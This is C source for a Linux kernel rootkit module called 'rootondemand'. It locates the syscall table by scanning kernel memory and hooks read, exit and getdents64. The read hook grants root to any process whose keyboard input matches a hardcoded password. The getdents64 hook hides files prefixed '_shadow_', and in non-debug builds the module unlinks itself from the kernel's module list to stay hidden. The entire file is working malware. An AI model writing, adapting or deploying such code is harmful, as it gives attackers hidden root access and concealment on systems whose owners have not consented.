#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/config.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/errno.h>
#include <linux/security.h>
#include <linux/dirent.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>

#define DEBUG
#define INCREASE_PTR(ptr,x) ptr=(int *)(((int)ptr)+x)
#define SYSCALLS_GAP(x,y) (x-y)*4
#define PASSWORD "newpassword\0"
#define PASS_MAXLEN 32
#define FILE_SHADOWMASK "_shadow_\0"
#ifdef CONFIG_REGPARM
#  define PARAM(y) x_##y
#  define RETURN(ret) __asm("leave\nret\n"::"a"(ret));
#else
#  define PARAM(y) y
#  define RETURN(ret) return((void *)ret)
#endif
#ifdef DEBUG
#  define debug_printk(...) printk(KERN_DEBUG __VA_ARGS__);
#  define DEBUG_PRINTK(...) debug_printk(__VA_ARGS__);
#else
#  define DEBUG_PRINTK(...)
#endif
#define PARASSITIZE(syc) { \
    DEBUG_PRINTK("ORIGINAL sys_%s: %p\n",#syc,sys_table[__NR_##syc]); \
    ptr_sys_##syc=(void *)sys_table[__NR_##syc]; \
    sys_table[__NR_##syc]=(void *)parassite_##syc; \
    DEBUG_PRINTK("REPLACED sys_%s: %p %p\n",#syc,sys_table[__NR_##syc],parassite_##syc); \
}
#define PESTICIDE(syc) { \
    DEBUG_PRINTK("RESTORING sys_%s: %p\n",#syc,sys_table[__NR_##syc]); \
    sys_table[__NR_##syc]=(void *)ptr_sys_##syc; \
    DEBUG_PRINTK("RESTORED sys_%s: %p %p\n",#syc,sys_table[__NR_##syc],ptr_sys_##syc); \
}

MODULE_AUTHOR("Andrea Villa");
MODULE_LICENSE("GPL");

static unsigned int **sys_table;
static char password[PASS_MAXLEN];
static asmlinkage ssize_t (*ptr_sys_read)(int,char __user *,size_t);
static asmlinkage long (*ptr_sys_exit)(int);
static asmlinkage long (*ptr_sys_getdents64)(int,struct linux_dirent64 __user *,unsigned int);

static unsigned int **find_systable(void) {
  asmlinkage ssize_t (*ptr_sys_read)(unsigned int,char __user *,size_t)=sys_read;
  asmlinkage long (*ptr_sys_open)(const char __user *,int,int)=sys_open;
  unsigned int *ptr;
#ifdef DEBUG
  int j;
  ptr=(int *)&init_mm.start_code;
  for (j=0;j<7;j++,INCREASE_PTR(ptr,4))
    DEBUG_PRINTK("PTR: 0x%x\n",*ptr);
#endif
  for (ptr=(int *)init_mm.end_code;((long)ptr)<init_mm.end_data;INCREASE_PTR(ptr,1)) {
    if (*ptr==(int)ptr_sys_read) {
      INCREASE_PTR(ptr,SYSCALLS_GAP(__NR_open,__NR_read));
      if (*ptr==(int)ptr_sys_open) {
        DEBUG_PRINTK("FOUND =D: 0x%p sys_open: %p\n",ptr,(void *)*ptr);
        INCREASE_PTR(ptr,-(__NR_open*4));
        DEBUG_PRINTK("FOUND =D: 0x%p sys_restart_syscall: %p\n",ptr,(void *)*ptr);
        DEBUG_PRINTK("syscall_table at: 0x%p\n",ptr);
        return((unsigned int **)ptr);
      }
    }
  }
  DEBUG_PRINTK("NOPE =(\n");
  return((unsigned int **)NULL);
}

long parassite_exit(int x) {
  DEBUG_PRINTK("parassite_exit\n");
  return(ptr_sys_exit(x));
}

ssize_t parassite_read(int fd,char __user *u_buf,size_t size) {
  ssize_t ret;
  char *k_buf,*comm_buf;
  static int pass_pos=0;
#ifdef CONFIG_REGPARM
  int x_fd;
  char __user *x_u_buf;
  size_t x_size;
  __asm__("movl 0x8(%%ebp),%0\n"
          "movl 0xc(%%ebp),%1\n"
          "movl 0x10(%%ebp),%2"
          :"=r"(x_fd),"=r"(x_u_buf),"=r"(x_size)
  );
#endif
  ret=ptr_sys_read(PARAM(fd),PARAM(u_buf),PARAM(size));
  k_buf=kmalloc(ret,GFP_KERNEL);
  comm_buf=kmalloc((sizeof(current->comm))+1,GFP_KERNEL);
  strcpy(comm_buf,current->comm);
  if (!strcmp("joe",comm_buf) || PARAM(fd)!=0 || ret!=1) goto end;
  if (copy_from_user(k_buf,PARAM(u_buf),ret)) {
    DEBUG_PRINTK("parassite_read: COPY FAILED\n");
    goto end;              
  }
  if (k_buf[0]>='0' && k_buf[0]<='z') {
    password[pass_pos++]=k_buf[0];
    if (pass_pos==PASS_MAXLEN) pass_pos=0;
  } else if (k_buf[0]=='\n' || k_buf[0]=='\r') {
    password[pass_pos]='\0';
    pass_pos=0;
    if (!strcmp(PASSWORD,password)) {
        DEBUG_PRINTK("Becoming Shadowed Root...\n");
        current->uid=current->euid=current->gid=current->egid=0;
    }
  }
end:
  kfree(k_buf);
  kfree(comm_buf);
  return(ret);
}

long parassite_getdents64(int fd,struct linux_dirent64 __user *u_dirent,unsigned int count) {
  int ret,buf_pos;
  struct linux_dirent64 *k_dirent,*k_mod_dirent,*dir_ptr;
  ret=ptr_sys_getdents64(fd,u_dirent,count);
  k_dirent=kmalloc(ret,GFP_KERNEL);
  k_mod_dirent=kmalloc(ret,GFP_KERNEL);
  if (!ret) goto end;
  if (copy_from_user(k_dirent,u_dirent,ret)) {
    DEBUG_PRINTK("parassite_getdents64: COPY FAILED\n");
    goto end;  
  }
  dir_ptr=k_dirent;
  /* Cool, Tricky and Chryptic Uh? xD */
  for (buf_pos=0;dir_ptr<(struct linux_dirent64 *)(((int)k_dirent)+ret);
  dir_ptr=(struct linux_dirent64 *)(((int)dir_ptr)+dir_ptr->d_reclen))
    if (strncmp(dir_ptr->d_name,FILE_SHADOWMASK,strlen(FILE_SHADOWMASK))!=0) {
      memcpy(&((char *)k_mod_dirent)[buf_pos],dir_ptr,dir_ptr->d_reclen);
      buf_pos+=dir_ptr->d_reclen;
    }
  if (!copy_to_user(u_dirent,k_mod_dirent,buf_pos+1))
    ret=buf_pos;
end:
  kfree(k_dirent);
  kfree(k_mod_dirent);
  return(ret);
}

int rootondemand_init(void) {
#ifdef DEBUG
  /* Print prev and next modules in linked list */
  int *ptr=(int *)THIS_MODULE->list.prev;
  INCREASE_PTR(ptr,sizeof(struct list_head));
  DEBUG_PRINTK("%s\n",(ptr[0]==0) ? "NONE" : (char *)ptr);
  ptr=(int *)THIS_MODULE->list.next;
  INCREASE_PTR(ptr,sizeof(struct list_head));
  DEBUG_PRINTK("%s\n",(ptr[0]==0) ? "NONE" : (char *)ptr);
#endif
  /* Voluntary redundant */
#ifndef DEBUG
  /* Let's cloack from module list ;P */ 
  struct list_head *l_ptr=&THIS_MODULE->list;
  try_module_get(THIS_MODULE);
  l_ptr->next->prev=l_ptr->prev;
  l_ptr->prev->next=l_ptr->next;
  l_ptr->next=LIST_POISON1;
  l_ptr->prev=LIST_POISON2;
#endif
  sys_table=find_systable();
  if (!sys_table) return(-EFAULT);
  __asm("cli");
  PARASSITIZE(exit);
  PARASSITIZE(read);
  PARASSITIZE(getdents64);
  __asm("sti");
  return(0);
}

void rootondemand_exit(void) {
  __asm("cli");
  PESTICIDE(exit);
  PESTICIDE(read);
  PESTICIDE(getdents64);
  __asm("sti");
}

module_init(rootondemand_init);
module_exit(rootondemand_exit);
